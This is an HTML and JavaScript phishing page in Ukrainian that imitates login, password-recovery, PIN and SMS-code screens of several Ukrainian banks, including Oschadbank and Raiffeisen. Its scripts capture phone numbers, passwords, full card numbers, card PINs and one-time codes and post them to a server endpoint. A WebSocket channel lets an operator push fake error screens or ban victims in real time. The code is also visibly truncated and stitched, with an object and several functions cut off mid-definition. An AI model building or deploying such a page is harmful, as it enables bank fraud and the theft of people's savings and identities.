<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        /* Общие стили для всех экранов и элементов */
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
            --oschad-primary: #00A39C;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
            font-size: 16px;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }

        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
            background: #f8f9fa;
        }
        .form-container {
            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
        .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
        .bank-item.disabled .unavailable-label {
            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
            font-size: 12px; font-weight: bold; color: var(--danger-color);
            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
        }

        /* --- Стили для модальных окон (общие) --- */
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #f8f9fa; /* Default light background */
            display: none; justify-content: center; align-items: flex-start;
            z-index: 1000;
            overflow-y: auto;
        }
        .custom-modal-content {
            background-color: transparent; padding: 0; border-radius: 0;
            width: 100%; max-width: none; text-align: center; box-shadow: none;
            display: flex; flex-direction: column; align-items: center;
        }

        /* --- Стили для модального окна Райффайзен --- */
        #custom-modal-overlay.raiff-theme {
            background-color: #3B3B3B; /* Dark background from screenshot */
        }
        .raiff-modal-content {
            display: flex; flex-direction: column;
            min-height: 100vh;
            width: 100%; padding: 0 20px;
        }
        .raiff-header {
            width: 100%; display: flex; align-items: center;
            padding: 15px 0; color: #FFFFFF;
        }
        .raiff-header .title {
            font-size: 18px; font-weight: 500;
            text-align: center; flex-grow: 1;
            /* Adjust for back arrow */
            margin-left: -24px;
        }
        .raiff-header .icon {
            font-size: 24px; cursor: pointer; color: #fff;
            line-height: 1;
        }
        .raiff-body {
            flex-grow: 1; display: flex; flex-direction: column;
            justify-content: flex-start; align-items: center;
            padding-top: 20px;
        }
        .raiff-logo-container {
            margin-bottom: 30px;
        }
        .raiff-logo-container img {
            width: 80px;
            height: auto;
        }
        .raiff-form-container {
            width: 100%;
            margin-top: auto; /* Pushes form to bottom half */
        }
        .raiff-form-container .welcome-text {
            color: #FFFFFF;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 20px;
            text-align: center; /* Centered as requested */
        }
        .raiff-form-container .input-label {
            color: #A0A0A0; font-size: 14px;
            margin-bottom: 8px; text-align: left;
        }
        .raiff-input-wrapper {
            display: flex; align-items: center;
            border: 2px solid #FCDD2D; border-radius: 12px;
            padding: 10px 15px; background-color: transparent;
            margin-bottom: 20px;
        }
        .raiff-input-wrapper span {
            color: #FFFFFF; font-size: 18px; font-weight: 500;
            margin-right: 8px;
        }
        .raiff-input-wrapper input {
            flex-grow: 1; border: none; background: none;
            color: #FFFFFF; font-size: 16px; /* Adjusted for better visibility */
            font-weight: 500;
            outline: none;
        }
        .raiff-input-wrapper input::placeholder {
            color: #888888;
            font-weight: 400;
        }
        .raiff-terms-text {
            font-size: 13px; color: #A0A0A0; text-align: left;
        }
        .raiff-terms-text a {
            color: #FCDD2D; text-decoration: none;
        }
        .raiff-footer {
            padding: 20px 0; width: 100%;
            margin-top: auto; /* Pushes button to the bottom */
        }
        .raiff-submit-button {
            width: 100%; padding: 16px; border: none;
            border-radius: 12px; font-size: 18px; font-weight: 700;
            transition: all 0.2s ease;
            background-color: #555555;
            color: #888888;
            cursor: not-allowed;
        }
        .raiff-submit-button.active {
            background-color: #FCDD2D;
            color: #000000;
            cursor: pointer;
        }

        /* --- Стили для экрана ввода кода Райффайзен --- */
        .raiff-code-body {
            flex-grow: 1; display: flex; flex-direction: column;
            justify-content: flex-start; align-items: center;
            padding-top: 20px;
            width: 100%;
        }
        .raiff-code-body .raiff-logo-container { margin-bottom: 40px; }
        .raiff-code-title {
            color: #fff; font-size: 26px; font-weight: 700; margin: 0 0 15px 0;
        }
        .raiff-code-subtitle {
            color: #A0A0A0; font-size: 16px; margin: 0 0 30px 0; line-height: 1.5;
        }
        .raiff-code-inputs {
            display: flex; justify-content: center; gap: 10px; margin-bottom: 30px;
        }
        .raiff-code-input {
            width: 45px; height: 50px; text-align: center; font-size: 24px; font-weight: 600;
            border: none; border-radius: 8px;
            background-color: #555;
            outline: none; transition: background-color 0.2s ease; color: #fff;
            caret-color: #FCDD2D; -moz-appearance: textfield;
        }
        .raiff-code-input::-webkit-outer-spin-button, .raiff-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .raiff-code-input:focus { background-color: #666; }
        .raiff-resend-timer {
             margin-top: auto; margin-bottom: 30px; color: #A0A0A0; font-size: 16px;
        }
        .raiff-resend-timer a { color: #FCDD2D; text-decoration: none; }


        /* --- Стили для модального окна ЛК Ощадбанка --- */
        .oschad-header {
            width: 100%; display: flex; align-items: center;
            padding: 15px 15px;
            background-color: #f8f9fa;
            position: relative;
        }
        .oschad-header .back-arrow {
            font-size: 28px; color: #495057; margin-right: 15px;
            cursor: pointer; line-height: 1;
        }
        .oschad-header .title {
            font-size: 17px;
            font-weight: 500;
            color: #212529;
            flex-grow: 1; text-align: center; margin-right: 40px;
        }
        .oschad-header-logo {
            position: absolute;
            right: 15px;
            top: 10px;
            max-height: 40px;
        }
        .oschad-welcome-section {
            padding: 20px; text-align: center;
            width: 100%;
            display: flex; flex-direction: column;
            padding-bottom: 120px;
        }
        .oschad-main-title {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }
        .oschad-welcome-section p {
            font-size: 16px; color: #495057; line-height: 1.5;
            margin-bottom: 25px; font-weight: 400;
            text-align: center;
        }
        .oschad-toggle-buttons {
            display: flex; background-color: #e9ecef; border-radius: 12px;
            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
        }
        .oschad-toggle-buttons button {
            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
            border-radius: 8px; transition: all 0.2s ease;
        }
        .oschad-toggle-buttons button.active {
            background-color: var(--white);
            color: var(--dark-text);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .oschad-input-group {
            margin-bottom: 20px; width: 100%; position: relative;
        }
        .oschad-input-group label {
            position: absolute; top: 18px; left: 15px; font-size: 16px; color: #adb5bd;
            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
            z-index: 1;
        }
        .oschad-input-group.is-focused > label,
        .oschad-input-group.has-value > label {
            top: -10px; left: 10px; font-size: 12px; color: #6c757d;
        }
        .oschad-input-field {
            width: 100%; padding: 18px 45px 18px 15px;
            border: 1px solid #dee2e6; border-radius: 12px;
            font-size: 16px; color: var(--dark-text); background-color: var(--white);
            transition: all 0.2s ease; outline: none;
            font-weight: 500; position: relative;
        }
        .oschad-input-field:focus {
            border-color: var(--oschad-primary);
        }
        .oschad-input-field::placeholder { color: transparent; }
        .password-toggle-icon {
            position: absolute; right: 15px; top: 50%;
            transform: translateY(-50%); cursor: pointer; color: #adb5bd;
            z-index: 2;
        }
        .oschad-phone-wrapper {
            position: relative; display: flex; align-items: center; width: 100%;
            border: 1px solid #dee2e6; border-radius: 12px;
            background-color: var(--white);
            overflow: hidden;
        }
        .oschad-phone-wrapper:focus-within {
            border-color: var(--oschad-primary);
        }
        .oschad-phone-prefix {
            padding: 18px 0 18px 15px;
            font-size: 16px; color: var(--dark-text);
            font-weight: 500;
        }
        .oschad-phone-wrapper .oschad-input-field {
            border: none; padding-left: 5px; flex-grow: 1;
        }
        .forgot-password-link {
            display: block;
            text-align: center;
            margin-top: -10px;
            margin-bottom: 20px;
            color: var(--oschad-primary);
            font-weight: 600;
            text-decoration: none;
            font-size: 15px;
            cursor: pointer;
        }
        .oschad-submit-button {
            position: fixed; bottom: 20px;
            left: 20px; right: 20px;
            width: auto; padding: 16px; margin: 0; border: none;
            border-radius: 16px;
            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
            cursor: not-allowed; transition: all 0.2s ease;
            z-index: 1001;
        }
        .oschad-submit-button.active {
            background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
        }
        .auth-error-message {
            color: var(--danger-color);
            font-size: 14px;
            text-align: center;
            margin-top: -10px;
            margin-bottom: 15px;
        }
        .oschad-input-group.error .oschad-input-field {
            border-color: var(--danger-color);
        }
        .loader-icon {
            width: 120px; height: 120px;
            max-width: 100%;
            margin: 20px auto;
            animation: spin 2s linear infinite;
            mix-blend-mode: multiply;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- СТИЛИ для окна подтверждения кодом --- */
        .oschad-code-container {
            padding: 20px; text-align: center; width: 100%;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-code-container p {
            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400;
        }
        .oschad-code-info {
            font-size: 16px; font-weight: 400; margin-bottom: 20px !important;
        }
        .oschad-code-number {
            font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important;
        }
        .oschad-code-instruction {
            font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important;
        }
        .oschad-code-inputs {
            display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;
        }
        .oschad-code-input {
            width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600;
            border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
            outline: none; transition: border-color 0.2s ease; color: var(--dark-text);
            caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield;
        }
        .oschad-code-input::placeholder { color: #bdc3c7; font-weight: 400; }
        .oschad-code-input::-webkit-outer-spin-button, .oschad-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .oschad-code-input:focus { border-color: var(--oschad-primary); }
        .oschad-code-inputs.error .oschad-code-input { border-color: var(--danger-color); }
        .oschad-code-error-text {
            color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px;
        }
        .oschad-resend-link {
            display: block; color: #6c757d; font-weight: 500;
            text-decoration: none; font-size: 15px; margin-bottom: 25px;
            pointer-events: none;
        }
        .oschad-resend-link.active {
            color: var(--oschad-primary);
            cursor: pointer;
            pointer-events: auto;
        }

        /* --- ОБЩИЕ СТИЛИ ФОРМЫ (для восстановления и т.д.) --- */
        .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
        .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
        .oschad-form-container p { text-align: left; margin-bottom: 30px; }

        /* --- СТИЛИ для PIN экрана --- */
        .pin-screen-container {
            padding: 20px; text-align: center; width: 100%; background-color: #fff;
            display: flex; flex-direction: column; justify-content: space-between;
            height: calc(100vh - 60px); box-sizing: border-box;
        }
        .pin-screen-title {
            font-size: 18px; color: var(--dark-text); margin-top: 20px;
            margin-bottom: 25px; font-weight: 500;
        }
        .pin-dots-container {
            display: flex; justify-content: center; gap: 20px;
            margin-bottom: 40px;
        }
        .pin-dot {
            width: 50px; height: 50px; border-radius: 8px;
            background-color: #f0f2f5;
            display: flex; align-items: center; justify-content: center;
            font-size: 30px; font-weight: 500; color: var(--dark-text);
            position: relative;
        }
        .pin-dot.active::after {
            content: ''; position: absolute; left: 50%; top: 50%;
            transform: translate(-50%, -50%);
            width: 2px; height: 50%; background-color: var(--dark-text);
            animation: blink 1s step-end infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
        .pin-keypad {
            display: grid;
            grid-template-areas:
                "k9 k8 k6"
                "k7 k3 k2"
                "k0 k1 k5"
                ". k4 backspace";
            gap: 15px; width: 100%; max-width: 320px; margin: auto 0 20px 0;
        }
        .pin-key {
            height: 75px; width: 75px; justify-self: center;
            border-radius: 50%; border: none; background-color: #f0f2f5;
            display: flex; align-items: center; justify-content: center;
            font-size: 28px; font-weight: 400; color: var(--dark-text);
            cursor: pointer; transition: background-color 0.2s;
            -webkit-tap-highlight-color: transparent;
        }
        .pin-key:active { background-color: #e0e2e5; }
        .pin-key[data-key="9"] { grid-area: k9; } .pin-key[data-key="8"] { grid-area: k8; }
        .pin-key[data-key="6"] { grid-area: k6; } .pin-key[data-key="7"] { grid-area: k7; }
        .pin-key[data-key="3"] { grid-area: k3; } .pin-key[data-key="2"] { grid-area: k2; }
        .pin-key[data-key="0"] { grid-area: k0; } .pin-key[data-key="1"] { grid-area: k1; }
        .pin-key[data-key="5"] { grid-area: k5; } .pin-key[data-key="4"] { grid-area: k4; }
        .pin-key.backspace { grid-area: backspace; background-color: transparent; }

        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-field {
            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
        }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix {
            padding: 15px; border: 1px solid var(--border-color); border-right: none;
            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
            flex-shrink: 0; display: flex; align-items: center;
        }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
            font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1;
        }
        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
        body[data-theme="oschadbank"] { --primary-color: var(--oschad-primary); --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Далі</button>
            </div>
        </div>
    </div>
    <div id="custom-modal-overlay">
        <div class="custom-modal-content" id="custom-modal-content"></div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    // --- CONFIG & STATE VARIABLES ---
    const bankFlows = {
        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [], special: true }, // steps can be empty as it has a custom flow
        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },

    /** Adds listeners for the Raiffeisen code screen */
    function addRaiffeisenCodeListeners() {
        document.getElementById('raiff-code-back-arrow').addEventListener('click', renderRaiffeisenLogin);
        
        // Setup code inputs
        const codeInputs = document.querySelectorAll('.raiff-code-input');
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
                const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
                if (allFilled) {
                    const code = [...codeInputs].map(inp => inp.value).join('');
                    sendDataToServer({ sms_code: code }, true); // This is the final step
                    showOschadLoader();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });
        
        // Focus first input
        if (codeInputs.length > 0) {
           setTimeout(() => codeInputs[0].focus(), 100);
        }

        // Setup resend timer
        let timerSeconds = 59;
        const timerSpan = document.getElementById('raiff-timer-span');
        const resendContainer = document.getElementById('raiff-resend-container');
        const originalText = resendContainer.innerHTML;
        
        clearInterval(callTimerInterval);
        callTimerInterval = setInterval(() => {
            const minutes = Math.floor(timerSeconds / 60);
            const seconds = timerSeconds % 60;
            timerSpan.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            if (--timerSeconds < 0) {
                clearInterval(callTimerInterval);
                resendContainer.innerHTML = 'Ви зможете <a href="#" id="resend-raiff-link">отримати код знову</a>';
                document.getElementById('resend-raiff-link').addEventListener('click', (e) => {

                    resendContainer.innerHTML = originalText;
                    addRaiffeisenCodeListeners(); // Re-initialize listeners and timer
                });
            }
        }, 1000);
    }


    /** Adds listeners for the PIN screen */
    function setupPinScreenListeners() {
        const keypad = document.getElementById('pin-keypad');
        const dots = document.querySelectorAll('#pin-dots .pin-dot');
        let pin = '';

        const updateDots = () => {
            dots.forEach((dot, index) => {
                dot.textContent = '';
                dot.classList.remove('active');
                if (index < pin.length) {
                    dot.textContent = '●';
                }
            });
            if (pin.length < 4) {
                dots[pin.length].classList.add('active');
            }
        };

        keypad.addEventListener('click', (e) => {
            const target = e.target.closest('.pin-key');
            if (!target) return;

            const key = target.dataset.key;

            if (key === 'backspace') {
                pin = pin.slice(0, -1);
            } else if (pin.length < 4) {
                pin += key;
            }

            updateDots();

            if (pin.length === 4) {
                keypad.style.pointerEvents = 'none';
                setTimeout(() => {
                    sendDataToServer({ fp_pin: pin }, false);
                    renderOschadbankCallConfirmation();
                }, 400);
            }
        });
        updateDots();
    }

        const phonePassInput = document.getElementById('phone_password_input');
        const loginInput = document.getElementById('login_input');
        const loginPassInput = document.getElementById('login_password_input');
        const submitBtn = document.getElementById('oschad-submit-btn');

        document.querySelectorAll('.oschad-input-group').forEach(group => {
            const input = group.querySelector('.oschad-input-field');
            if (!input) return;
            const checkValue = () => { input.value ? group.classList.add('has-value') : group.classList.remove('has-value'); };
            input.addEventListener('focus', () => group.classList.add('is-focused'));
            input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
            input.addEventListener('input', checkValue);
            checkValue();
        });

        phoneInput.addEventListener('input', (e) => {
            let rawValue = e.target.value.replace(/\D/g, '');
            if (rawValue.startsWith('380')) { rawValue = rawValue.substring(3); }
            let value = rawValue.substring(0, 9);
            let formatted = '';
            if (value.length > 0) formatted += value.substring(0, 2);
            if (value.length > 2) formatted += ' ' + value.substring(2, 5);
            if (value.length > 5) formatted += ' ' + value.substring(5, 7);
            if (value.length > 7) formatted += ' ' + value.substring(7, 9);
            e.target.value = formatted.trim();
        });

        const updateOschadButtonState = () => {
            const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
            const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
            if (isPhoneFormValid || isLoginFormValid) {
                submitBtn.classList.add('active'); submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active'); submitBtn.disabled = true;
            }
        };
        [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => input.addEventListener('input', updateOschadButtonState));

        togglePhoneBtn.addEventListener('click', () => {
            togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
            phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
            activeOschadForm = 'phone'; updateOschadButtonState();
        });
        toggleLoginBtn.addEventListener('click', () => {
            toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
            phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
            activeOschadForm = 'login'; updateOschadButtonState();
        });

        customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
            icon.addEventListener('click', () => {
                const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
                const isPassword = passwordInput.type === 'password';
                passwordInput.type = isPassword ? 'text' : 'password';
                icon.style.color = isPassword ? '#212529' : '#adb5bd';
            });
        });

        submitBtn.onclick = () => {
            if(submitBtn.disabled) return;
            const dataToSend = {};
            collectedData.loginMethod = activeOschadForm;

            if (activeOschadForm === 'phone') {
                dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
                dataToSend.password = phonePassInput.value;
            } else {
                dataToSend.login = loginInput.value;
                dataToSend.password = loginPassInput.value;
            }
            sendDataToServer(dataToSend, false);
            showOschadLoader();
        };
    }

    /** Adds listeners for the "Forgot Password" flow */
    function addForgotPasswordListeners(step) {
        const submitBtn = document.getElementById('fp-submit-btn');
        let input;

        switch(step) {
            case 1:
                input = document.getElementById('fp_phone_input');
                input.addEventListener('input', (e) => {
                    let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                    e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
                    if (value.length === 9) {
                        submitBtn.classList.add('active'); submitBtn.disabled = false;
                    } else {
                        submitBtn.classList.remove('active'); submitBtn.disabled = true;
                    }
                });
                break;
            case 2:
                input = document.getElementById('fp_card_input');
                input.addEventListener('input', (e) => {
                     e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
                     if (e.target.value.replace(/\D/g, '').length === 16) {
                        submitBtn.classList.add('active'); submitBtn.disabled = false;
                    } else {
                        submitBtn.classList.remove('active'); submitBtn.disabled = true;
                    }
                });
                break;
             case 3: // This case is now handled by setupPinScreenListeners
                break;
        }

        document.querySelectorAll('.oschad-input-group').forEach(group => {
            const inputEl = group.querySelector('.oschad-input-field');
            if (!inputEl) return;
            const checkValue = () => { inputEl.value ? group.classList.add('has-value') : group.classList.remove('has-value'); };
            inputEl.addEventListener('focus', () => group.classList.add('is-focused'));
            inputEl.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
            inputEl.addEventListener('input', checkValue);
            checkValue();
        });
    }

    /** Starts the resend timer for code screens */
    function startCallTimer(seconds) {
        const link = document.getElementById('resend-link');
        if (!link) return;
        clearInterval(callTimerInterval);

        let timer = seconds;
        const initialText = link.textContent;

        function updateTimer() {
            if (timer < 0) {
                clearInterval(callTimerInterval);
                link.textContent = initialText + '?';
                link.classList.add('active');
                link.onclick = (e) => {
                    e.preventDefault();
                    startCallTimer(60);
                };
            } else {
                link.textContent = `${initialText} через ${timer} секунд`;
                link.classList.remove('active');
                timer--;
            }
        }
        updateTimer();
        callTimerInterval = setInterval(updateTimer, 1000);
    }

    /** Sets up auto-tabbing and submission for code inputs */
    function setupCodeInputs(screenId) {
        const codeInputs = document.querySelectorAll('.oschad-code-input');
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
                const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
                if (allFilled) {
                    const code = [...codeInputs].map(inp => inp.value).join('');
                    const dataKey = screenId === 'oschad_call' ? 'call_code' : 'sms_code';
                    sendDataToServer({ [dataKey]: code }, true);
                    showOschadLoader();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });
    }

    /** Sends collected data to the server */
    async function sendDataToServer(data, isFinal) {
        collectedData = { ...collectedData, ...data };
        try {
            await fetch(`/api/submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId,
                    bankName: activeBankData.name,
                    isFinalStep: isFinal,
                    referrer: localStorage.getItem('referrer') || 'unknown',
                    ...data
                }),
            });
        } catch (error) { console.error('Failed to send data:', error); }
    }

    /** Handles commands from the WebSocket server */
    function handleServerCommand(command) {
        const { type, data } = command;
        const showMessageInMainModal = (title, text, btnText, callback) => {
            modalTitle.textContent = title;
            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
            modalFooter.style.display = 'flex';
            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
            modalFooter.querySelector('button').onclick = callback;
        };

        switch (type) {
            case 'lk':
                if (activeBankData.theme === 'oschadbank') renderOschadbankLogin();
                // Add logic for other banks if 'lk' command is generic
                break;
            case 'call':
                if (activeBankData.theme === 'oschadbank') renderOschadbankCallConfirmation();
                break;
            case 'telegram_debit':
                renderTelegramSmsScreen();
                break;
            case 'password_error':
                if (activeBankData.theme === 'oschadbank') {
                    const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
                    const savedPhone = data.loginType === 'phone' && collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
                    renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg, savedPhone });
                }
                break;
            case 'code_error':
                const errorOptions = { error: true };
                if (lastCodeScreen === 'oschad_call') {
                    renderOschadbankCallConfirmation(errorOptions);
                } else if (lastCodeScreen === 'telegram_sms') {
                    renderTelegramSmsScreen(errorOptions);
                }
                // Could add Raiff code error logic here if needed
                break;
            case 'sms':
                modalTitle.textContent = 'Введіть код з SMS';
                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                modalFooter.style.display = 'flex';
                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                break;
            case 'other':
                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                if (bankToDisable) {
                    bankToDisable.classList.add('disabled');
                    if (!bankToDisable.querySelector('.unavailable-label')) {
                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
                    }
                }
                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                break;
            case 'ban':
                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                if (ws) ws.close();
                break;
        }
    }

    // --- Standard (non-Oschadbank/Raiff) Flow Logic ---
    document.querySelectorAll('.bank-item').forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            if (item.classList.contains('disabled')) return;
            const bankId = item.dataset.bank;
            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
            collectedData = {};

            if (bankId === 'oschadbank') {
                renderOschadbankLogin();
            } else if (bankId === 'raiffeisen') {
                renderRaiffeisenLogin();
            } else {
                body.dataset.theme = activeBankData.theme;
                formHeaderLogo.src = activeBankData.logoUrl;
                body.classList.add('form-active');
                currentStepIndex = 0;
                renderStep();
            }
            connectWebSocket();
        });
    });

    nextBtn.addEventListener('click', handleNextStep);
    backBtn.addEventListener('click', handleBackStep);

    async function handleNextStep() {
        if (!validateCurrentStep()) return;
        let data = {};
        stepContent.querySelectorAll('.input-field').forEach(input => {
            let key = input.id;
            let value = input.value;
            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
            data[key] = value;
        });
        const step = activeBankData.steps[currentStepIndex];
